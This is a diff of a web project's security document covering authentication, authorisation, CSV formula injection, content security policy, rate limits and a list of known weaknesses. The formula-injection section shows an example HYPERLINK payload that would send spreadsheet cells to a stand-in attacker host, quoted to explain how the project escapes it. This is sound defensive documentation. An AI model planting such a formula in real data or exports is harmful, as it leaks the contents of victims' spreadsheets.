@@ -1,14 +1,14 @@
 # Security
 
 This document describes how Visual Project Manager handles identity,
-authorisation and untrusted input — and, at the end, what it does not
-handle. The second list matters more than the first. A security document
-that only lists strengths is a marketing page.
+authorisation and untrusted input, and at the end what it does not handle.
+The second list matters more than the first. A security document that only
+lists strengths is a marketing page.
 
 **Status:** this is a portfolio project. It runs against a local
 development stack and has never held anybody's real data. Several
 decisions below are correct for that setting and would need revisiting
-before it held anybody else's — each one says so where it applies.
+before it held anybody else's; each one says so where it applies.
 
 ---
 
@@ -35,7 +35,7 @@ live in its own database, not in the token.
 
 Putting roles in the token was the obvious alternative and it is worse
 here. Membership changes far more often than identity does, and a token
-carrying `role: OWNER` stays valid until it expires — so removing somebody
+carrying `role: OWNER` stays valid until it expires, so removing somebody
 from a project would leave them able to administer it for up to fifteen
 minutes. It also means every membership change forces a token refresh, and
 scales the token with the number of projects a person belongs to.
@@ -55,7 +55,7 @@ lockout
 
 **OpenID Connect, Authorization Code with PKCE.** The Angular client is a
 public client with no secret, because a secret in a browser bundle is
-readable by anyone who opens the developer tools — it is not a secret, it
+readable by anyone who opens the developer tools. It is not a secret, it
 is a string. PKCE replaces it with a per-request proof that only the tab
 which started the flow can produce.
 
@@ -68,7 +68,7 @@ entirely would accept tokens minted by *any* realm on that server. See
 `SecurityConfig.jwtDecoder`.
 
 **A token with no `sub` claim is rejected outright.** Not defensive
-padding — Spring Data turns a null parameter into `WHERE keycloak_sub IS
+padding: Spring Data turns a null parameter into `WHERE keycloak_sub IS
 NULL`, which matches every not-yet-linked row. A token without a subject
 would silently adopt somebody else's account, and the next one would adopt
 it in turn. `CurrentUser.require()` throws instead.
@@ -99,10 +99,10 @@ public TaskResponse update(Long projectId, Long id, TaskRequest request)
 | Role     | Read the plan | Change the plan | Rename, delete, manage people |
 |----------|:-------------:|:---------------:|:-----------------------------:|
 | `OWNER`  | ✓             | ✓               | ✓                             |
-| `EDITOR` | ✓             | ✓               | —                             |
-| `VIEWER` | ✓             | —               | —                             |
+| `EDITOR` | ✓             | ✓               | ✗                             |
+| `VIEWER` | ✓             | ✗               | ✗                             |
 
-Anyone may remove **themselves** from a project regardless of role — see
+Anyone may remove **themselves** from a project regardless of role; see
 `ProjectAccess.canRemoveMember`. A project cannot be left without an
 owner, which is refused for departures and demotions alike.
 
@@ -115,8 +115,8 @@ integers and you learn how many projects the system holds and which ids
 are live.
 
 A **member** who lacks the role for an action does get a 403, with the
-reason. They already know the project exists — hiding why the button did
-nothing would only leave them guessing.
+reason. They already know the project exists, and hiding why the button
+did nothing would only leave them guessing.
 
 ### Insecure direct object references
 
@@ -131,11 +131,11 @@ learns nothing about whether it exists elsewhere. The same pairing means a
 dependency edge can never be made to reach across into another plan.
 
 Assignment is checked the same way. `assignee_id` accepts only a user who
-is a member of that project — otherwise the column would be a way to
-attach a stranger's account to your plan, and their name would then be
-read back out of the task list by everybody in it. The schema cannot
-express that rule: its foreign key says "some user", and what is needed is
-"a member of this project".
+is a member of that project. Otherwise the column would be a way to attach
+a stranger's account to your plan, and their name would then be read back
+out of the task list by everybody in it. The schema cannot express that
+rule: its foreign key says "some user", and what is needed is "a member of
+this project".
 
 ---
 
@@ -143,8 +143,8 @@ express that rule: its foreign key says "some user", and what is needed is
 
 **Bean Validation on the DTO, CHECK constraints in the schema.** Both, on
 purpose: the annotations turn bad input into a readable 400, and the
-constraints are the line nobody can bypass — not an application bug, not a
-manual `INSERT`, not a future second writer.
+constraints are the line nobody can bypass, not by an application bug, not
+by a manual `INSERT`, not by a future second writer.
 
 **Colour is matched against `^#[0-9A-Fa-f]{6}$`** before it is stored. That
 value ends up in an inline `style` attribute on the Gantt bars, so it is
@@ -177,45 +177,120 @@ server.error.include-message: never
 Actuator exposes `health` and nothing else. The other endpoints publish
 configuration, beans and environment variables.
 
-### CSV export, and formula injection
+### The exports, and formula injection
 
-The CSV export is an output path with a genuine injection surface, and it is
-worth being explicit about because it does not look like one.
+The CSV export is an output path with a genuine injection surface, and it
+is worth being explicit about because it does not look like one.
 
-A cell whose text begins with `=`, `+`, `-` or `@` is a **formula** to Excel,
-Google Sheets and LibreOffice alike. So a task titled
+A cell whose text begins with `=`, `+`, `-` or `@` is a **formula** to
+Excel, Google Sheets and LibreOffice alike. So a task titled
 
 ```
 =HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for the report")
 ```
 
-is inert everywhere in this application — Angular escapes it, the schedule
-shows it as text — and becomes executable the moment somebody exports the plan
-and opens the file. The route runs from data one project member can type to a
-spreadsheet another member opens on their own machine, which is the part that
-makes it worth defending rather than shrugging at.
+is inert everywhere in this application, where Angular escapes it and the
+schedule shows it as text. It becomes executable the moment somebody
+exports the plan and opens the file. The route runs from data one project
+member can type to a spreadsheet another member opens on their own
+machine, which is the part that makes it worth defending rather than
+shrugging at.
 
-`escapeCell` in `core/export.ts` prefixes any such value with an apostrophe,
-the mitigation those three applications all understand as "the rest is text".
-Numbers never pass through it, so a negative figure stays a number. RFC 4180
-quoting is applied on top and separately: quoting alone is *not* a defence,
-because a spreadsheet strips the CSV quoting before it decides what the cell
-means.
+`escapeCell` in `core/export.ts` prefixes any such value with an
+apostrophe, the mitigation those three applications all understand as "the
+rest is text". Numbers never pass through it, so a negative figure stays a
+number. RFC 4180 quoting is applied on top and separately: quoting alone
+is *not* a defence, because a spreadsheet strips the CSV quoting before it
+decides what the cell means.
 
-The file is written in the browser from data the caller already has, so this
-adds no new access — the concern is entirely about what happens to it after it
-is saved. `export.spec.ts` pins all four prefixes.
+The iCal export has no equivalent hazard, because no calendar client
+evaluates the text of an event. Its escaping is about parse integrity
+rather than execution: an unescaped newline or semicolon ends a property
+early and the remainder is read as a content line of its own, which turns
+a task description into a malformed import.
+
+Both files are written in the browser from data the caller already has, so
+neither adds new access; the concern is entirely about what happens to
+them after they are saved. `export.spec.ts` pins all four spreadsheet
+prefixes.
+
+---
+
+## Response headers
+
+Two servers answer requests here and they need different things.
+
+**The API** takes Spring Security's defaults, which are right: `nosniff`,
+`X-Frame-Options: DENY`, and `Cache-Control: no-store` on everything.
+`X-XSS-Protection` is deliberately `0`, because the legacy auditor it
+enabled introduced vulnerabilities of its own.
+
+**The application** is static files behind nginx, and until recently sent
+nothing at all. It is the half that renders HTML and holds the tokens, so
+it is the half where headers matter most. `frontend/security-headers.conf`
+now carries them, and the policy is:
+
+```
+default-src 'self';
+script-src  'self';
+style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
+font-src    'self' https://fonts.gstatic.com;
+img-src     'self' data:;
+connect-src 'self' http://localhost:8080 http://localhost:8081;
+frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
+```
+
+plus `nosniff`, `X-Frame-Options: DENY`,
+`Referrer-Policy: strict-origin-when-cross-origin`, a `Permissions-Policy`
+that denies every device this application does not use, and
+`server_tokens off`.
+
+`script-src 'self'` is the one worth having, and it is the one that took
+work. Angular's critical-CSS inliner shipped the stylesheet as
+`<link media="print" onload="this.media='all'">` with the plain link only
+inside `<noscript>`, which makes an inline event handler the only path by
+which a scripted browser receives any CSS. A strict `script-src` blocks it
+and the application renders unstyled.
+`optimization.styles.inlineCritical: false` in `angular.json` is what
+makes the directive possible, and it is there for that reason alone.
+
+`style-src` keeps `'unsafe-inline'`. Angular injects component styles as
+`<style>` elements at runtime, so without a nonce they are inline styles,
+and a nonce would have to be minted per response and substituted into both
+the header and an `ngCspNonce` attribute. A server handing out static
+files is the wrong shape for that, and it would mean `index.html` could
+never be cached. The trade is deliberate rather than overlooked:
+CSS injection leaks a little through selectors, script injection does
+anything at all, and the strictness is spent where it buys the most. The
+chart's `[style.background]` bindings need no exception either way, since
+Angular writes those through the CSSOM, which `style-src` does not govern.
+
+`connect-src` names the API and Keycloak by absolute URL because this
+build is pinned to localhost, exactly as `API_BASE_URL` and the OIDC
+authority already are. A deployment templates all three from one place.
+
+One nginx detail, because it is the sort that fails silently: `add_header`
+inside a `location` **replaces** the inherited set rather than extending
+it. The `add_header Cache-Control` on hashed assets would therefore have
+stripped every security header from precisely the scripts and stylesheets
+that most need `nosniff`. The headers are a separate file included from
+both locations, and deliberately not in `conf.d/`, which nginx globs into
+the `http` block and which would have sent every header three times.
+
+Verified against the built image: the headers arrive once each, assets
+carry them alongside the cache header, and the application renders with
+its own typography and colours and no console violation.
 
 ---
 
 ## CSRF, CORS, rate limiting
 
 **CSRF protection is off, deliberately.** The attack needs a credential
-the browser attaches *automatically* — a cookie. This API authenticates
-with a `Bearer` header that a cross-site form cannot set, so there is
-nothing to forge. **If the client ever moves to cookie-based sessions,
-this must come back on**, and the comment in `SecurityConfig` says so at
-the point where it would be changed.
+the browser attaches *automatically*, which means a cookie. This API
+authenticates with a `Bearer` header that a cross-site form cannot set, so
+there is nothing to forge. **If the client ever moves to cookie-based
+sessions, this must come back on**, and the comment in `SecurityConfig`
+says so at the point where it would be changed.
 
 **CORS allows exactly one origin,** from configuration, defaulting to the
 development frontend. Not a wildcard, and not reflected from the `Origin`
@@ -223,9 +298,9 @@ header.
 
 **Writes are rate limited; reads are not.** A token bucket per caller, 120
 writes a minute, refilling continuously. Reads cost a query and are what a
-person does by having the page open — a limit low enough to stop abusive
-reading would interrupt somebody switching between the schedule and the
-chart. Writes are what grow the database and set dependency and
+person does by having the page open, and a limit low enough to stop
+abusive reading would interrupt somebody switching between the schedule
+and the chart. Writes are what grow the database and set dependency and
 critical-path recalculation going.
 
 Buckets are keyed by the token's **subject**, not by IP, so an office
@@ -233,9 +308,36 @@ behind one NAT address does not share a single allowance. Refill is greedy
 rather than by interval: an interval refill lets a caller drain the bucket,
 wait for the boundary and drain it again, which is twice the intended rate.
 
+**There are ceilings as well as a rate,** because the two answer different
+questions and only one of them was being asked. 120 writes a minute is a
+limit on how fast; the answer to how much was "for ever". One account at
+that rate adds roughly a hundred and seventy thousand rows a day and never
+stops, and with open registration that account costs an email address.
+Separately harmless, together a way to fill a disk.
+
+So: 2000 tasks per project, 100 members per project, 100 projects per
+person, all configuration and all set far above anything honest. Two
+details are load-bearing. Membership is counted rather than ownership,
+because counting what somebody created is walked around by making a
+project, handing it over and making another. And the members ceiling is
+checked *before* the user lookup, so a refused invitation is not a way of
+writing rows into the users table for arbitrary addresses.
+
+The task ceiling counts live rows only. Counting soft-deleted ones would
+mean a project that reached the limit could never get back under it, and
+deleting a task is the only remedy the interface offers.
+
 **Password brute force is Keycloak's job:** five failures, temporary
 lockout, up to fifteen minutes, no permanent lockout (which is itself a
 denial-of-service vector against a known username).
+
+**The direct access grant is off.** `directAccessGrantsEnabled: false` on
+`vpm-frontend`, so username and password cannot be exchanged for a token
+directly; the only way in is the browser flow with PKCE. This is worth
+stating because the running instance and the committed realm had drifted
+apart on exactly this point, and the file is the one anybody reads.
+Re-importing the realm is what makes them agree, and there is no
+mechanism here that keeps them agreeing.
 
 ---
 
@@ -244,7 +346,7 @@ denial-of-service vector against a known username).
 There are none in this repository.
 
 `.env` and `.env.example` hold development values for containers listening
-on localhost — `vpm_local_dev`, `admin`. They protect nothing that is
+on localhost: `vpm_local_dev`, `admin`. They protect nothing that is
 reachable from anywhere else, and the file says so. Real deployments would
 take these from the platform's environment and from GitHub Secrets.
 
@@ -260,17 +362,25 @@ mattered.
 
 **1. Tokens live in `sessionStorage`, so they are reachable by injected
 script.** This is the significant one. They are cleared when the tab
-closes and are not shared between tabs, and the access token's fifteen
-minutes bounds the damage — but any successful XSS reads both tokens.
+closes and are not shared between tabs, the access token's fifteen minutes
+bounds the damage, and the content security policy above makes an
+injection considerably harder to land. None of that is a fix: an XSS that
+does land reads both tokens, and a policy is depth rather than a boundary.
 The structural fix is a backend-for-frontend holding the refresh token in
 an `httpOnly` cookie, which would also bring CSRF protection back into
 scope. Out of scope here, and named as such in `auth.config.ts`.
 
+The refresh token is bound to the Keycloak session rather than being an
+offline token, which is why the OIDC library warns about the missing
+`offline_access` scope at startup. Adding the scope would silence the
+warning by issuing a token that outlives sign-out, which is the wrong
+direction; the warning stays.
+
 **2. The optimistic-concurrency check is opt-in.** `expectedUpdatedAt` is
 optional on `TaskRequest`. A client that omits it gets last-write-wins
 with no warning. It is optional because requiring it would break every
-existing caller at once and because unconditional writes are legitimate —
-but it means the protection is a convention, not a guarantee. This
+existing caller at once and because unconditional writes are legitimate.
+But it means the protection is a convention rather than a guarantee. This
 application always sends it.
 
 **3. Rate-limit buckets are in memory, per instance.** Two instances
@@ -289,24 +399,41 @@ anybody who can reach the sign-in screen can create an account and create
 projects. Correct for a demo people are invited to try; a real deployment
 would restrict registration to an identity provider or an invitation.
 
-**6. The demo seed writes directly to the database.** `scripts/demo/`
+**6. Inviting somebody tells you whether their address has an account.**
+`POST /projects/{id}/members` answers with `signedUp` and, for an address
+that already exists, that person's real display name rather than the email
+that was submitted. So anybody who can create a project, which with open
+registration is anybody at all, can test an arbitrary address and learn
+both whether it is registered here and who it belongs to.
+
+It is not patched, and the reason is worth stating rather than papering
+over with a changed response body. The disclosure is inherent to
+invitation without consent: the member list shows the same name a moment
+later, so hiding it in the one response would be theatre. The real fix is
+an invitation the invitee accepts, with the membership pending and the
+identity unrevealed until they do, and that is a feature rather than a
+patch. Slack, Notion and Linear all behave the way this does, which
+explains the choice without excusing it. The ceilings above bound how far
+the enumeration scales; they do not close it.
+
+**7. The demo seed writes directly to the database.** `scripts/demo/`
 takes the Keycloak bootstrap admin and a database container name and
-bypasses the API entirely — which is the only way to seed a history with
+bypasses the API entirely. That is the only way to seed a history with
 dates in the past, and also why it must never be pointed at anything real.
 
-**7. The audit log is append-only by convention, not by grant.** Nothing
+**8. The audit log is append-only by convention, not by grant.** Nothing
 in the application deletes or updates a row in `audit_log`, and no
 endpoint exposes a way to. But the application's database user is the
 owner of the table and could. A real tamper-evident log needs either a
 restricted grant or somewhere the application cannot write at all.
 
-**8. Soft-deleted tasks are kept forever.** `deleted_at` is set and the row
-stays, deliberately — it is what keeps dependency references and history
+**9. Soft-deleted tasks are kept forever.** `deleted_at` is set and the row
+stays, deliberately: it is what keeps dependency references and history
 readable. There is no retention policy, and under GDPR "we keep it
 indefinitely because it was convenient" is not one of the lawful bases.
 
-**9. Four advisories in the dependency tree** — two moderate, two high, as
-of the last `npm audit`. All four (`undici`, `hono`, `fast-uri`) arrive
+**10. Four advisories in the dependency tree**, two moderate and two high
+as of the last `npm audit`. All four (`undici`, `hono`, `fast-uri`) arrive
 through `@angular/build` and `@angular/cli`, which are `devDependencies`:
 they are part of the build toolchain and none of them reaches the shipped
 bundle. They are worth tracking and are not worth forcing a resolution
